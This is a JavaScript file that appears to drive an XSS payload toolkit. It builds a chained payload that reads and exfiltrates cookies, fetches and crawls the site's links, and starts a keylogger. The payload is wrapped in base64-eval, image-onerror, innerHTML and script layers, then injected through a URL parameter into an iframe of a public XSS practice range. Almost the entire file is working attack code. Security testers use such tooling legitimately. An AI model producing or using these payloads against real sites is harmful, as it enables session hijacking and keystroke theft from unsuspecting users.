
import { ClickJacker, Wrapper, MessageHandler, Payload, Exfiltrators, utils } from "./xsstools.min.js"



const $ = (s) => document.querySelector(s);
const $$ = (s) => Array.from(document.querySelectorAll(s));
const sleep = (ms) => new Promise((r) => window.setTimeout(r, ms));

/**
 * Log anything to the console
 * Object and arrays will be printed as json
 * HTMLElement will show their outerHTML
 * @param {...Any} args Value to log in the console
 */
function log(...args) {
    const msg = args
        .map((arg) => {
            if (typeof arg == "string") {
                return arg;
            }
            if (arg instanceof HTMLElement) {
                return arg.outerHTML;
            }
            try {
                return JSON.stringify(arg);
            } catch {
                return arg.toString();
            }
        })
        .join(" ");
    const msgEL = document.createTextNode(`${msg}\n`)
    $("#console pre").appendChild(msgEL);
}

/**
 * Open a new iframe on the side panel
 *
 * @param {string} url Url for the frame
 * @param {string} [name=null] name of the frame
 * @param {SandboxAttributes} sandbox reverse sandbox option
 */
function openFrame(url, name = null, sandbox = {}) {
    return $("#frames div").appendChild(utils.createFrame(url, name, sandbox));
}


async function main() {

    const target = "https://public-firing-range.appspot.com/reflected/parameter/body"


    new MessageHandler().listen().logMessages(log);
    const exfiltrator = Exfiltrators.message()

    const payload = Payload.new()
        .addExfiltrator(exfiltrator)
        .eval(() => {
            document.cookie = "token=secret"
        })
        .eval(x => `Cookies: ${document.cookie}`)
        .exfiltrate()
        .exfiltrate("Retreiving all the links on /")
        .fetchDOM("/")
        .querySelectorAll("a", "pathname")
        .forEach(
            Payload.new().eval(p => `Found link: ${p}`).exfiltrate()
        )
        .exfiltrate("Starting keylogger")
        .startKeyLogger()


    const wraper = Wrapper.new()
        .evalB64()
        .imgError()
        .innerHTML()
        .script()


    const wrapped = wraper.wrap(payload)

    log("Compiled payload", wrapped)

    const params = {
        q: wrapped
    }

    const url = utils.buildUrl(target, params)


    openFrame(url, "target");

}

document.addEventListener("DOMContentLoaded", main)

